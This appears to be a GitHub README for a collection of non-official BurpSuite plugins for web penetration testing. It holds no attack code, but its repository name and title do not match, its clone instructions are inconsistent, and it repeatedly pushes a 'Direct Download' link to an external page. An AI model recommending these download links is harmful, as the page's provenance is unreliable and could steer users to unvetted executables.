# BurpSuite-collections - Plugin Collection 2026

> **A handpicked set of BurpSuite plugins, extensions, and practical walkthroughs for security researchers and penetration testers.** This repository compiles non-BApp Store plugins, articles, and tips that expand BurpSuite's functionality beyond the official marketplace.

[![Scripts](https://img.shields.io/badge/Scripts-Collection-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/caleb-hughes2000/burpsuite-executor-scripts?style=flat-square)](https://github.com/caleb-hughes2000/burpsuite-executor-scripts)

---

<p align="center">
  <a href="https://caleb-hughes2000.github.io/burpsuite-executor-scripts/">
    <img src="https://img.shields.io/badge/Download-BurpSuite%20Collections-brightgreen?style=for-the-badge" alt="Download BurpSuite Collections">
  </a>
</p>

> **[Direct Download - BurpSuite-collections](https://caleb-hughes2000.github.io/burpsuite-executor-scripts/)**

---

[Download Latest Build](https://caleb-hughes2000.github.io/burpsuite-executor-scripts/)

---

## About This Repository

This project acts as a centralized resource for BurpSuite users seeking to augment their toolset with extensions absent from the official BApp Store. The collection encompasses Java-based plugins, Python integrations, and specialized utilities for web application security testing—covering SQL injection, Shiro vulnerability scanning, WAF evasion, and more. Each plugin is accompanied by relevant articles and practical guidance for integrating them into penetration testing workflows.

The focus is on curating community-driven extensions that solve real-world testing problems. From advanced request manipulation via HackBar to database exploitation helpers like sqlmap integration and framework-specific scanners such as j2eescan, this repository offers a comprehensive reference. It receives periodic updates to reflect emerging techniques and plugin versions, though it no longer includes crack files for BurpSuite.

---

## Plugin Categories

- **Burp Extensions** - Custom Java plugins that enhance BurpSuite's base capabilities
- **Burp Requests** - Tools for advanced request construction and modification
- **BurpSuite Extender** - Modular add-ons leveraging the Burp Extender API
- **BurpSuite Tools** - Utility scripts supporting automated testing workflows
- **HackBar & SendTo** - Quick payload injection and data forwarding utilities
- **SQLMap Integration** - Scripts enabling seamless sqlmap tunneling through Burp
- **Shiro & WAF Tools** - Scanners targeting Apache Shiro vulnerabilities and WAF detection
- **Python-Burp** - Python automation scripts that interface with BurpSuite

---

## Getting Started

Clone the repository and place the plugins into your BurpSuite Extender directory:

```bash
git clone https://github.com/caleb-hughes2000/burpsuite-executor-scripts.git
cd BurpSuite-collections
```

Load individual `.jar` or `.py` files via BurpSuite's Extender tab. For the Shiro scanner as an example:

1. Open BurpSuite → Extender → Extensions
2. Click "Add" and choose the `shiro-burp.jar` file
3. The extension will appear in the Extensions list

---

## Compatibility

| Component | Supported Versions |
|-----------|-------------------|
| BurpSuite Community | 2022.x - 2024.x |
| BurpSuite Professional | 2022.x - 2024.x |
| Java Runtime | Java 11+ |
| Python (for py extensions) | Python 3.6+ |

---

## Directory Structure

```
BurpSuite-collections/
├── burp-extensions/       # Java plugin JARs
├── burp-requests/         # Request manipulation tools
├── burpsuite-tools/       # Utility scripts and helpers
├── python-burp/           # Python integration scripts
├── configs/               # Sample configuration files
├── docs/                  # Usage guides and articles
└── examples/              # Demonstration scripts
```

---

## Frequently Asked Questions

**How often does this collection receive updates?**  
Updates occur periodically as new plugins and techniques become available. Check the commit history for the latest additions.

**Can I modify the plugins?**  
Yes, most extensions are open-source. You can adjust the source code to match your specific testing requirements.

**Will these plugins work with the newest BurpSuite releases?**  
We strive to maintain compatibility with recent BurpSuite versions, though some older plugins may need updates. Check individual plugin documentation for details.

**Where are the plugins stored locally?**  
After download, plugins reside in your local clone directory. You can relocate them anywhere and load them through BurpSuite's Extender interface.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
